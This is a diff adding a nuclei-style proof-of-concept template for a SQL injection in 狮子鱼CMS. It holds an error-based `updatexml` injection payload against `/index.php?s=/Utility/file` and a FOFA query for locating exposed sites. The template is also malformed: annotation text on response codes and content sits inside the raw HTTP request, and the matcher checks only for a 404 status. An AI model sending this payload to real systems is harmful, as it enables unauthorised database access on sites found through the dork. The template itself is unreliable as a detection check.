@@ -1,0 +1,34 @@
+id: poc-kzcpne6a75c4c8pp
+info:
+  name: 狮子鱼CMS SQL注入漏洞2
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kzcpne6a75c4c8pp'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: kzcpne6a75c4c8pp
+    fofa: body="/seller.php?s=/Public/login"
+http:
+- raw:
+  - 'GET /index.php?s=/Utility/file&do=image&groupid=123)%20or%20updatexml(1,concat(0x7e,user(),0x7e),1)--+ HTTP/1.1
+
+
+    # 响应代码特征
+
+    404
+
+
+    # 响应内容特征
+
+    SQLSTATE
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 404
+    type: status
